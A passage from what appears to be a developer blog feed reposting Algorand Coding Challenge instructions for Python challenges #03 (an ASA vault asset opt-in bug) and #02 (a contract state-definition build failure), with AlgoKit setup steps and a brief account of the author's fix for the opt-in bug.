&lt;p&gt;If you don&apos;t know what &lt;code&gt;opt-in&lt;/code&gt; is it is a unique feature on Algorand that prevents someone from sending a token to an account that hasn&apos;t opted in to the token that is being sent. You can learn more about opt-ins &lt;a href=&quot;https://developer.algorand.org/docs/get-details/algokit/utils/ts/capabilities/asset/?from_query=opt%20in#opt-inout&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The smart contract builds successfully but if you try deploying and testing the smart contract by opening Docker Desktop, and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all # set up dev environment on your computer
algokit localnet start # launch an Algorand local network for testing
algokit project run build # Compile the smart contract and get low-level TEAL code.
algokit project deploy localnet # Run the `smart_contracts/asa_vault/deploy_config.py` file to deploy and test the smart contract.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail and show this error:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algosdk.error.AlgodHTTPError: TransactionPool.Remember: transaction ESKVFLSCWNUNJJWMF34QBEQHTXGWFQNDTBYS3MBXZQNEIQOYLKXQ: receiver error: must optin, asset 1442 missing from NIADJIGAJ2KYNX5HJ35I7RK66VVN6SE6NBUB46NJXAC4USYXJEYSXDH4JQ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and fix the bug.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/1182612934455722075&quot;&gt;Algorand Python Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Install Python 3.12 or higher&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you have 2 ways of opening your AlgoKit project.&lt;/p&gt;
&lt;h3&gt;With VSCode Workspaces&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;li&gt;Open workspace mode by clicking &lt;code&gt;open workspace&lt;/code&gt; inside of &lt;code&gt;python-challenge-3.code-workspace&lt;/code&gt; file at the root level.&lt;/li&gt;
&lt;li&gt;Go inside of the &lt;code&gt;challenge&lt;/code&gt; folder.&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependencies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
5. Activate Python virtual environment by running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please note, in addition to built-in support for &lt;a href=&quot;https://code.visualstudio.com/docs/editor/workspaces&quot;&gt;VSCode Workspaces&lt;/a&gt;, the cli provides native support for monorepos called &lt;code&gt;algokit workspaces&lt;/code&gt;. Refer to &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/project/run.md#workspace-vs-standalone-projects&quot;&gt;documentation&lt;/a&gt; for detailed guidelines for recommended project structures and ability to leverage custom command orchestration via &lt;code&gt;algokit project run&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Without VSCode Workspaces&lt;/h3&gt;
&lt;p&gt;All AlgoKit projects initialized with &lt;code&gt;--workspace&lt;/code&gt; option has the following directory structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; projects
    smart-contract
    frontend # doesn&apos;t exist for this project
    ...
 {several config files...}
 ...
 .algokit.toml # workspace-typed algokit project config
 {project-name}.code-workspace
 README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So to access a single project under the &lt;code&gt;projects&lt;/code&gt; folder, it is recommended to &lt;code&gt;cd&lt;/code&gt; into the project you want to work with and then open your code editor (alternatively refer to VSCode Workspace file at the root). If you are reading this and didn&apos;t open the &lt;code&gt;challenge&lt;/code&gt; folder directly, go do that now!! &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cd into &lt;code&gt;projects/challenge&lt;/code&gt; then open the code editor&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependencies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
3. Activate the Python virtual environment by running below inside of &lt;code&gt;challenge&lt;/code&gt; folder:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;smart_contracts/asa_vault/contract.py&lt;/code&gt; and see the source code of the ASA vault smart contract.&lt;/li&gt;
&lt;li&gt;Compile the contract with &lt;code&gt;algokit project run build&lt;/code&gt; and then try running the test script with &lt;code&gt;algokit project deploy localnet&lt;/code&gt;. It will fail.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;smart_contracts/asa_vault/deploy_config.py&lt;/code&gt; to understand the deployment/test script.&lt;/li&gt;
&lt;li&gt;Read the error, figure out what is wrong, and fix the bug! The bug is inside of the ASA Vault contract. There is nothing wrong with the deploy script inside of &lt;code&gt;smart_contracts/asa_vault/deploy_config.py&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;After fixing the bug, build and run the deploy script again with the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project run build
algokit project deploy localnet
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;OR if you are on VSCode, hit F5 or go to the &lt;code&gt;Run and Debug&lt;/code&gt; tab and run the debug script.&lt;/p&gt;
&lt;p&gt;If you see something like this in the console, you successfully fixed the bug! 
&amp;lt;img width=&quot;1217&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-coding-challenges/python-challenge-3/assets/52557585/79b4a6a8-ce59-4e64-85bf-35bc82583869&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/dapps/smart-contracts/apps/innertx/?from_query=inner%20t#template-modal-overlay&quot;&gt;Inner Transaction Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://algorandfoundation.github.io/puya/api-algopy.itxn.html#algopy.itxn.AssetTransfer&quot;&gt;Algorand Python Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/transactions/transactions/?from_query=zero%20asset%20transfer#asset-transfer-transaction:~:text=A%20zero%20amount%20transferred%20to%20self%20allocates%20that%20asset%20in%20the%20account%27s%20Asset%20map.&quot;&gt;How to opt-in to an asset with assetTransfer txn&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the result of running the deploy script.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The certificate of completion NFT for Python challenges was designed by &lt;a href=&quot;https://twitter.com/MaarsComics&quot;&gt;Maars&lt;/a&gt;, an artist &amp;amp; a dev in web3. Definitely follow his work! It&apos;s awesome. &lt;/p&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev!&lt;/p&gt;
&lt;h2&gt;Below is the default readme of the Python AlgoKit Template. Read to learn more about this template.&lt;/h2&gt;
&lt;p&gt;This project has been generated using AlgoKit. See below for default getting started instructions.&lt;/p&gt;
&lt;h1&gt;Setup&lt;/h1&gt;
&lt;h3&gt;Pre-requisites&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Python 3.12&lt;/a&gt; or later&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; (only required for LocalNet)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Initial setup&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Clone this repository locally&lt;/li&gt;
&lt;li&gt;Install pre-requisites:
&lt;ul&gt;
&lt;li&gt;Make sure to have &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; installed and running on your machine.&lt;/li&gt;
&lt;li&gt;Install &lt;code&gt;AlgoKit&lt;/code&gt; - &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli#install&quot;&gt;Link&lt;/a&gt;: The recommended version is &lt;code&gt;1.7.3&lt;/code&gt;. Ensure you can execute &lt;code&gt;algokit --version&lt;/code&gt; and get &lt;code&gt;1.7.1&lt;/code&gt; or later.&lt;/li&gt;
&lt;li&gt;Bootstrap your local environment; run &lt;code&gt;algokit bootstrap all&lt;/code&gt; within this folder, which will:
&lt;ul&gt;
&lt;li&gt;Install &lt;code&gt;Poetry&lt;/code&gt; - &lt;a href=&quot;https://python-poetry.org/docs/#installation&quot;&gt;Link&lt;/a&gt;: The minimum required version is &lt;code&gt;^1.7&lt;/code&gt;. Ensure you can execute &lt;code&gt;poetry -V&lt;/code&gt; and get &lt;code&gt;1.2&lt;/code&gt;+&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;poetry install&lt;/code&gt; in the root directory, which will set up a &lt;code&gt;.venv&lt;/code&gt; folder with a Python virtual environment and also install all Python dependencies&lt;/li&gt;
&lt;li&gt;Copy &lt;code&gt;.env.template&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;algokit localnet start&lt;/code&gt; to start a local Algorand network in Docker. If you are using VS Code launch configurations provided by the template, this will be done automatically for you.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open the project and start debugging / developing via:
&lt;ul&gt;
&lt;li&gt;VS Code
&lt;ol&gt;
&lt;li&gt;Open the repository root in VS Code&lt;/li&gt;
&lt;li&gt;Install recommended extensions&lt;/li&gt;
&lt;li&gt;Hit F5 (or whatever you have debug mapped to) and it should start running with breakpoint debugging.
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;
If using Windows: Before running for the first time you will need to select the Python Interpreter.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Open the command palette (Ctrl/Cmd + Shift + P)&lt;/li&gt;
&lt;li&gt;Search for &lt;code&gt;Python: Select Interpreter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Select &lt;code&gt;./.venv/Scripts/python.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;JetBrains IDEs (please note, this setup is primarily optimized for PyCharm Community Edition)
&lt;ol&gt;
&lt;li&gt;Open the repository root in the IDE&lt;/li&gt;
&lt;li&gt;It should automatically detect it&apos;s a Poetry project and set up a Python interpreter and virtual environment.&lt;/li&gt;
&lt;li&gt;Hit Shift+F10|Ctrl+R (or whatever you have debug mapped to) and it should start running with breakpoint debugging. Please note, JetBrains IDEs on Windows have a known bug that in some cases may prevent executing shell scripts as pre-launch tasks, for workarounds refer to &lt;a href=&quot;https://youtrack.jetbrains.com/issue/IDEA-277486/Shell-script-configuration-cannot-run-as-before-launch-task&quot;&gt;JetBrains forums&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Other
&lt;ol&gt;
&lt;li&gt;Open the repository root in your text editor of choice&lt;/li&gt;
&lt;li&gt;In a terminal run &lt;code&gt;poetry shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;python -m smart_contracts&lt;/code&gt; through your debugger of choice&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Subsequently&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;If you uppublished to the latest source code and there are new dependencies you will need to run &lt;code&gt;algokit bootstrap all&lt;/code&gt; again&lt;/li&gt;
&lt;li&gt;Follow step 3 above&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;For guidance on &lt;code&gt;smart_contracts&lt;/code&gt; folder and adding new contracts to the project please see &lt;a href=&quot;smart_contracts/README.md&quot;&gt;README&lt;/a&gt; on the respective folder.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Tools&lt;/h1&gt;
&lt;p&gt;This project makes use of Algorand Python to build Algorand smart contracts. The following tools are in use:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.algorand.com/&quot;&gt;Algorand&lt;/a&gt; - Layer 1 Blockchain; &lt;a href=&quot;https://developer.algorand.org/&quot;&gt;Developer portal&lt;/a&gt;, &lt;a href=&quot;https://developer.algorand.org/docs/get-started/basics/why_algorand/&quot;&gt;Why Algorand?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli&quot;&gt;AlgoKit&lt;/a&gt; - One-stop shop tool for developers building on the Algorand network; &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/algokit.md&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/tutorials/intro.md&quot;&gt;intro tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;Algorand Python&lt;/a&gt; - A semantically and syntactically compatible, typed Python language that works with standard Python tooling and allows you to express smart contracts (apps) and smart signatures (logic signatures) for deployment on the Algorand Virtual Machine (AVM); &lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/puya/tree/main/examples&quot;&gt;examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-utils-py&quot;&gt;AlgoKit Utils&lt;/a&gt; - A set of core Algorand utilities that make it easier to build solutions on Algorand.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://python-poetry.org/&quot;&gt;Poetry&lt;/a&gt;: Python packaging and dependency management.
It has also been configured to have a productive dev experience out of the box in &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VS Code&lt;/a&gt;, see the &lt;a href=&quot;./.vscode&quot;&gt;.vscode&lt;/a&gt; folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The error stated that the asset wasn&apos;t opted in.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;According to the documentation, if a smart contract wishes to transfer an asset it holds or needs to opt into an asset this can be done with an asset transfer inner transaction. So I added the transaction to &lt;code&gt;opt_in_to_asset.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafybeierejy4fcjygtcjhms4quhzabnjst5las4wreb7e5jvpxpu7se6gi?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Algorand Coding Challenge - Volume 2:  Python #02.</title><link>https://alan.com.ar/posts/algochallengepython02/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallengepython02/</guid><pubDate>Tue, 09 Apr 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/python-challenge-2&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 2: How Do You Store States on the Python Contract?! &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;When compiling my Python smart contract, it fails to build. There seems to be issues around how I am defining my states... &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside of &lt;code&gt;smart_contracts/counter/contract.py&lt;/code&gt; file, there is a simple counter smart contract written in Algorand Python.&lt;/p&gt;
&lt;p&gt;It is a simple contract that has an &lt;code&gt;opt_in&lt;/code&gt; method and an &lt;code&gt;increment&lt;/code&gt; method and it keeps track of how many counts each user has in the &lt;code&gt;count&lt;/code&gt; local state and the total amount of participants tracked in the &lt;code&gt;counters&lt;/code&gt; global state.&lt;/p&gt;
&lt;p&gt;However, if you try to build the smart contract by opening Docker Desktop, and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
algokit localnet start
algokit project run build # Compile the smart contract and get low-level TEAL code.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and fix the bug.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/1182612934455722075&quot;&gt;Algorand Python Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Install Python 3.12 or higher&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you have 2 ways of opening your AlgoKit project.&lt;/p&gt;
&lt;h3&gt;With VSCode Workspaces&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;li&gt;Open workspace mode by clicking &lt;code&gt;open workspace&lt;/code&gt; inside of &lt;code&gt;python-challenge-2.code-workspace&lt;/code&gt; file at the root level.&lt;/li&gt;
&lt;li&gt;Go inside of the &lt;code&gt;challenge&lt;/code&gt; folder.&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependecies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
5. Activate Python virtual environment by running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please note, in addition to built-in support for &lt;a href=&quot;https://code.visualstudio.com/docs/editor/workspaces&quot;&gt;VSCode Workspaces&lt;/a&gt;, the cli provides native support for monorepos called &lt;code&gt;algokit workspaces&lt;/code&gt;. Refer to &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/project/run.md#workspace-vs-standalone-projects&quot;&gt;documentation&lt;/a&gt; for detailed guidelines for recommended project structures and ability to leverage custom command orchestration via &lt;code&gt;algokit project run&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Without VSCode Workspaces&lt;/h3&gt;
&lt;p&gt;All AlgoKit projects initialized with &lt;code&gt;--workspace&lt;/code&gt; option has the following directory structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; projects
    smart-contract
    frontend # doesn&apos;t exist for this project
    ...
 {several config files...}
 ...
 .algokit.toml # workspace-typed algokit project config
 {project-name}.code-workspace
 README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So to access a single project under the &lt;code&gt;projects&lt;/code&gt; folder, it is recommended to &lt;code&gt;cd&lt;/code&gt; into the project you want to work with and then open your code editor (alternatively refer to VSCode Workspace file at the root). If you are reading this and didn&apos;t open the &lt;code&gt;challenge&lt;/code&gt; folder directly, go do that now!! &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cd into &lt;code&gt;projects/challenge&lt;/code&gt; then open the code editor&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependecies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
3. Activate Python virtual environment by running below inside of &lt;code&gt;challenge&lt;/code&gt; folder:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;smart_contracts/counter/contract.py&lt;/code&gt; to see the source code of the counter smart contract.&lt;/li&gt;
&lt;li&gt;Try building the contract with &lt;code&gt;algokit project run build&lt;/code&gt;. It will fail.&lt;/li&gt;
&lt;li&gt;Figure out what is wrong and fix the bug!&lt;/li&gt;
&lt;li&gt;After fixing the bug, build and run the deploy script with the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project run build
algokit project deploy localnet
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;OR if you are on VSCode, hit F5 or go to the &lt;code&gt;Run and Debug&lt;/code&gt; tab and run the debug script.&lt;/p&gt;
&lt;p&gt;If you see something like this in the console, you successfully fixed the bug! 
&amp;lt;img width=&quot;945&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-coding-challenges/python-challenge-2/assets/52557585/9611641a-05a4-428c-ba52-aeee8dd7bb49&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/dapps/smart-contracts/apps/state/?from_query=global%20state#reading-global-state-from-other-smart-contracts&quot;&gt;Algorand Smart Contract Storage Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://algorandfoundation.github.io/puya/lg-storage.html&quot;&gt;Algorand Python Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/algokit.md&quot;&gt;AlgoKit CLI Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the result of running the deploy script.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The certificate of completion NFT for Python challenges were designed by &lt;a href=&quot;https://twitter.com/MaarsComics&quot;&gt;Maars&lt;/a&gt;, an artist &amp;amp; a dev in web3. Definitely follow his work! It&apos;s awesome. &lt;/p&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev! This was the final challenge of the 1st season of #AlgoCodingChallenge. Be on the lookout for the 2nd season of #AlgoCodingChallenge!&lt;/p&gt;
&lt;h2&gt;Below is the default readme of the Python AlgoKit Template. Read to learn more about this template.&lt;/h2&gt;
&lt;p&gt;This project has been generated using AlgoKit. See below for default getting started instructions.&lt;/p&gt;
&lt;h1&gt;Setup&lt;/h1&gt;
&lt;h3&gt;Pre-requisites&lt;/h3&gt;
&lt;ul&gt;
